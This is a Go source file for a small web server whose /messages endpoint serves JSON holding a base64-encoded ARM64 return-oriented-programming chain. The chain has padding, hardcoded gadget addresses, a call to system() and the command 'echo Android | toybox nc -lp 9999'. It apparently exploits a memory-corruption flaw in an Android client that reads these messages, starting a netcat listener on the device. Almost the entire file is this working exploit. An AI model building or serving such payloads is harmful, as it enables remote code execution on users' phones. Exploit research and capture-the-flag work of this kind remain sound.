package main

import (
	b64 "encoding/base64"
	"encoding/binary"
	"fmt"
	"strconv"

	"github.com/gin-gonic/gin"
)

func pack(v uint64) string {
	bs := make([]byte, 8)
	binary.LittleEndian.PutUint64(bs, v)
	return string(bs)
}

func main() {
	fmt.Println("Hallo")
	r := gin.Default()
	x := make([]map[string]string, 3)
	rop := "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

	rop += pack(0x0000007d0b8d70f4) // ldp x24, x23, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret;)
	rop += pack(0xdeadc0dedeadc0de)
	rop += pack(0x0000007d0b9c6ea0) // mov x0, sp; blr x24;
	rop += pack(0x7d09cfecc4)       // system
	rop += pack(0xdeadc0dedeadc0de)
	rop += pack(0xdeadc0dedeadc0de)
	rop += pack(0xdeadc0dedeadc0de)
	rop += pack(0xdeadc0dedeadc0de)
	rop += pack(0xdeadc0dedeadc0de)
	rop += "echo Android | toybox nc -lp 9999"
	rop += pack(0x0)
	message := rop
	value := b64.StdEncoding.EncodeToString([]byte(message))
	fmt.Println(rop)

	x[0] = map[string]string{"length": strconv.Itoa(len(value)), "message": value}
	r.GET("/messages", func(c *gin.Context) {
		c.JSON(200, x)

	})
	r.Run()
}
